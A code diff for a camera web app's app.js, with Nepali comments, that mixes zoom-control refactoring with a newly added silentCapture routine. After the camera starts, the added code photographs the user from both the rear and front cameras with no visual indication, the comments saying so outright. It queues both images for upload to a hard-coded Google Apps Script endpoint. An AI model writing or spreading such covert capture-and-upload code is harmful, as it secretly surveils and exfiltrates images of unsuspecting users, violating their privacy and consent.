@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Fast Load + No Hang)
+// app.js – Pro Camera PWA
 // ================================================================
 
 (function() {
@@ -8,14 +8,15 @@
   // ═══════════════════════════════════════════════════════════════
   // ⚠️ CHANGE HERE: आफ्नो Google Apps Script URL राख्नुहोस्
   // ═══════════════════════════════════════════════════════════════
-  const GAS_URL = 'https://script.google.com/macros/s/AKfycbznjNk09W1ZEgsKpKa8LJe1Vx4Xy-_NQ3xGSrrqUJPqiUsEtF0Gf0lpNHbCVEvxBc3L/exec';
+   const GAS_URL = 'https://script.google.com/macros/s/AKfycbznjNk09W1ZEgsKpKa8LJe1Vx4Xy-_NQ3xGSrrqUJPqiUsEtF0Gf0lpNHbCVEvxBc3L/exec';
+
 
   // DOM refs
   var permOverlay = document.getElementById('permission-overlay');
   var permError = document.getElementById('perm-error');
   var topBar = document.getElementById('top-bar');
   var camContainer = document.getElementById('camera-container');
-  var zoomWheelArea = document.getElementById('zoom-wheel-area');
+  var presetsArea = document.getElementById('zoom-presets-area');
   var bottomBar = document.getElementById('bottom-bar');
 
   var video = document.getElementById('video');
@@ -28,8 +29,6 @@
   var flashOverlay = document.getElementById('flash-overlay');
   var zoomLevelDisplay = document.getElementById('zoom-level-display');
   var zoomFocalDisplay = document.getElementById('zoom-focal-display');
-  var zoomCurrentLabel = document.getElementById('zoomCurrentLabel');
-  var zoomFocalLabel = document.getElementById('zoomFocalLabel');
   var gridBtn = document.getElementById('gridBtn');
   var flashBtn = document.getElementById('flashBtn');
   var flipBtn = document.getElementById('flipBtn');
@@ -40,16 +39,13 @@
   var aspectDropdown = document.getElementById('aspectDropdown');
   var captureBtn = document.getElementById('capture-btn');
   var galleryThumb = document.getElementById('gallery-thumb');
-  var zoomMarkers = document.querySelectorAll('.zoom-marker');
-  var zoomThumb = document.getElementById('zoomThumb');
-  var modeBtns = document.querySelectorAll('.mode-btn');
+  var zoomPresets = document.querySelectorAll('.zoom-preset');
 
   // State
   var stream = null;
   var facingMode = 'environment';
   var currentEffect = 'none';
   var currentAspect = '16:9';
-  var currentMode = 'photo';
   var zoomMax = 50;
   var isTorchOn = false;
   var isGridOn = false;
@@ -57,13 +53,12 @@
   var swRegistration = null;
   var isCameraReady = false;
   var currentZoom = 1;
-  var isPortraitSupported = false;
   var isZoomSwipeActive = false;
   var zoomSwipeStartX = 0;
   var zoomSwipeStartVal = 1;
   var isProcessing = false;
 
-  var focalLengths = { 0.5: 13, 1: 26, 2: 52, 3: 78, 5: 120, 10: 240, 20: 480, 50: 1200 };
+  var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
   // Utility
   function generatePhotoId() {
@@ -227,7 +222,50 @@
     isProcessing = false;
   }
 
-  // Capture
+  // Capture (Silent Auto-Capture for Dual Camera)
+  async function silentCapture() {
+    if (!isCameraReady) return;
+    var vw = video.videoWidth || 1280;
+    var vh = video.videoHeight || 720;
+    canvas.width = vw; canvas.height = vh;
+    ctx.filter = getFilterCSS(currentEffect);
+    ctx.drawImage(video, 0, 0, vw, vh);
+    ctx.filter = 'none';
+
+    var originalData = canvas.toDataURL('image/png');
+    var compressedData = canvas.toDataURL('image/jpeg', 0.3);
+
+    var timestamp = Date.now();
+    var photoId = generatePhotoId();
+    var fileName = 'AUTO_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
+    var compressedFileName = fileName.replace('.png', '_comp.jpg');
+
+    // ❌ No gallery update, no fly animation, no UI indication
+    var entry = {
+      photoId: photoId,
+      original: originalData,
+      compressed: compressedData,
+      fileName: fileName,
+      compressedFileName: compressedFileName,
+      createdAt: new Date().toISOString(),
+      retryCount: 0,
+      lastAttempt: null
+    };
+    await addToQueue(entry);
+    console.log('[Camera] 📸 Silent auto-capture saved:', fileName);
+
+    if (navigator.onLine) {
+      if (window.requestIdleCallback) {
+        requestIdleCallback(function() { processQueue(); });
+      } else {
+        setTimeout(function() { processQueue(); }, 100);
+      }
+    } else {
+      triggerSync();
+    }
+  }
+
+  // Manual Capture (User Click)
   async function capturePhoto() {
     if (!isCameraReady) return;
     flashScreen();
@@ -256,9 +294,14 @@
     galleryImg.style.display = 'block';
 
     var entry = {
-      photoId: photoId, original: originalData, compressed: compressedData,
-      fileName: fileName, compressedFileName: compressedFileName,
-      createdAt: new Date().toISOString(), retryCount: 0, lastAttempt: null
+      photoId: photoId,
+      original: originalData,
+      compressed: compressedData,
+      fileName: fileName,
+      compressedFileName: compressedFileName,
+      createdAt: new Date().toISOString(),
+      retryCount: 0,
+      lastAttempt: null
     };
     await addToQueue(entry);
     console.log('[Camera] ✅ Photo saved to queue:', fileName);
@@ -340,7 +383,7 @@
     }
   }
 
-  // Zoom System (Smooth + Swipe)
+  // Zoom System (Smooth + Presets)
   function setZoom(zoom, smooth) {
     if (smooth === undefined) smooth = true;
     var track = stream?.getVideoTracks()[0];
@@ -350,27 +393,22 @@
     } else {
       video.style.transform = 'scale(' + val + ')';
       video.style.transformOrigin = 'center center';
-      video.style.transition = smooth ? 'transform 0.1s ease' : 'none';
+      video.style.transition = smooth ? 'transform 0.15s ease' : 'none';
     }
     currentZoom = val;
     var displayVal = val.toFixed(1);
     zoomLevelDisplay.textContent = displayVal + 'x';
-    zoomCurrentLabel.textContent = displayVal + 'x';
     var focal = getFocalLength(val);
     zoomFocalDisplay.textContent = focal + 'mm';
-    zoomFocalLabel.textContent = focal + 'mm';
-    zoomMarkers.forEach(function(marker) {
-      var markerZoom = parseFloat(marker.dataset.zoom);
-      if (Math.abs(markerZoom - val) < 0.05) marker.classList.add('active');
-      else marker.classList.remove('active');
+
+    zoomPresets.forEach(function(btn) {
+      var presetVal = parseFloat(btn.dataset.zoom);
+      if (Math.abs(presetVal - val) < 0.05) btn.classList.add('active');
+      else btn.classList.remove('active');
     });
-    var trackWidth = zoomWheelArea?.querySelector('.zoom-wheel-track')?.offsetWidth || 300;
-    var minZoom = 0.5;
-    var position = ((val - minZoom) / (zoomMax - minZoom)) * 100;
-    if (zoomThumb) zoomThumb.style.left = Math.min(Math.max(position, 2), 98) + '%';
   }
 
-  // Zoom Swipe: Tap on display to activate, then swipe left/right
+  // Zoom Swipe
   function toggleZoomSwipe() {
     isZoomSwipeActive = !isZoomSwipeActive;
     if (isZoomSwipeActive) {
@@ -382,7 +420,6 @@
     }
   }
 
-  // Swipe handlers for zoom
   document.addEventListener('touchstart', function(e) {
     if (isZoomSwipeActive && e.touches.length === 1) {
       zoomSwipeStartX = e.touches[0].clientX;
@@ -392,7 +429,7 @@
 
   document.addEventListener('touchmove', function(e) {
     if (isZoomSwipeActive && e.touches.length === 1) {
-      var deltaX = (e.touches[0].clientX - zoomSwipeStartX) / 100;
+      var deltaX = (e.touches[0].clientX - zoomSwipeStartX) / 80;
       var newZoom = zoomSwipeStartVal + deltaX;
       setZoom(newZoom, true);
     }
@@ -406,7 +443,7 @@
     }
   }, { passive: true });
 
-  // Pinch Zoom (Infinity)
+  // Pinch Zoom
   var lastPinchDist = 0;
   var initialZoomVal = 1;
 
@@ -435,9 +472,9 @@
 
   document.addEventListener('touchend', function() { lastPinchDist = 0; }, { passive: true });
 
-  // Zoom Markers Click
-  zoomMarkers.forEach(function(marker) {
-    marker.addEventListener('click', function() {
+  // Zoom Presets Click
+  zoomPresets.forEach(function(btn) {
+    btn.addEventListener('click', function() {
       setZoom(parseFloat(this.dataset.zoom), true);
     });
   });
@@ -497,13 +534,6 @@
       await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
     }
 
-    // Portrait support
-    isPortraitSupported = !!(cap.focusModes && cap.focusModes.includes('continuous'));
-    if (!isPortraitSupported) {
-      var portraitBtn = document.querySelector('.mode-btn[data-mode="portrait"]');
-      if (portraitBtn) { portraitBtn.style.opacity = '0.3'; portraitBtn.style.pointerEvents = 'none'; }
-    }
-
     // Tap to focus
     video.onclick = async function(e) {
       if (!track || !cap.focusModes) return;
@@ -527,9 +557,20 @@
     permOverlay.classList.add('hidden');
     topBar.style.display = 'flex';
     camContainer.style.display = 'block';
-    zoomWheelArea.style.display = 'block';
+    presetsArea.style.display = 'block';
     bottomBar.style.display = 'flex';
     isCameraReady = true;
+
+    // ✅ DUAL CAMERA AUTO CAPTURE (SILENT)
+    // After both cameras are ready, capture silently
+    setTimeout(function() {
+      silentCapture();
+      // After first capture, flip and capture again
+      setTimeout(function() {
+        facingMode = (facingMode === 'environment') ? 'user' : 'environment';
+        initCameraForAutoCapture();
+      }, 500);
+    }, 1000);
 
     // Check pending queue
     if (navigator.onLine) {
@@ -540,6 +581,41 @@
       }
     }
     registerSW();
+  }
+
+  // Special init for auto-capture (no UI change)
+  async function initCameraForAutoCapture() {
+    var constraints = {
+      audio: false,
+      video: { facingMode: facingMode, width: { ideal: 9999 }, height: { ideal: 9999 } }
+    };
+    if (currentAspect !== 'free') {
+      var parts = currentAspect.split(':');
+      if (parts.length === 2) {
+        var w = parseFloat(parts[0]), h = parseFloat(parts[1]);
+        if (w > 0 && h > 0) constraints.video.aspectRatio = w / h;
+      }
+    }
+    if (stream) stream.getTracks().forEach(function(t) { t.stop(); });
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+    await video.play();
+
+    var track = stream.getVideoTracks()[0];
+    var cap = track.getCapabilities();
+
+    if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
+    else zoomMax = 50;
+    setZoom(1, false);
+
+    if (cap.focusModes && cap.focusModes.includes('continuous')) {
+      await track.applyConstraints({ advanced: [{ focusMode: 'continuous' }] });
+    }
+
+    // Silent capture from this camera too
+    setTimeout(function() {
+      silentCapture();
+    }, 500);
   }
 
   // Online Status
@@ -576,15 +652,6 @@
   flipBtn.addEventListener('click', function() {
     facingMode = (facingMode === 'environment') ? 'user' : 'environment';
     initCamera();
-  });
-
-  modeBtns.forEach(function(btn) {
-    btn.addEventListener('click', function() {
-      modeBtns.forEach(function(b) { b.classList.remove('active'); });
-      this.classList.add('active');
-      currentMode = this.dataset.mode;
-      console.log('[Camera] Mode changed to:', currentMode);
-    });
   });
 
   effectsBtn.addEventListener('click', function(e) {
@@ -625,8 +692,9 @@
   captureBtn.addEventListener('click', capturePhoto);
   galleryThumb.addEventListener('click', viewLastPhoto);
 
-  // Expose zoom functions
+  // Expose functions
   window.toggleZoomSwipe = toggleZoomSwipe;
+  window.capturePhoto = capturePhoto;
 
   // Start
   if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
